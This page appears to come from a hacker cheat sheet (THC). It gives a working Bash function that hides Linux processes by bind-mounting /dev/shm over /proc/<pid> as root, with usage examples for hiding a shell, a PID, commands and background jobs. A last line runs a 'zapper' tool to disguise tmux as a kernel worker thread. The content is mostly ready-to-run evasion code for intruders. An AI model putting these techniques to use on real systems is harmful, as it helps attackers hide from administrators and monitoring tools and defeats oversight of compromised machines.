# Hidden Process

## Scripting

### Bash

Hide process as `root`.

> [!IMPORTANT] Elevated Privileges are Required
> This script requires administrative rights and is an old Linux trick by over-mounting `/proc/<pid>` with a useless directory.

```bash
hide() {
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

Hides the current shell's process identifier.

```
$ hide
```

Hides a specific process identifier.

```
$ hide <pid>
```

Hides executed commands and arguments.

```
$ hide <commands>
```

Hides executed commands in a forked background process.

```
$ hide nohup <commands> &>/dev/null &
```

Replace the existing shell with `tmux` (with `exec`). Then start and hide `tmux` and all further processes - as some kernel process.

```
$ exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
```

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)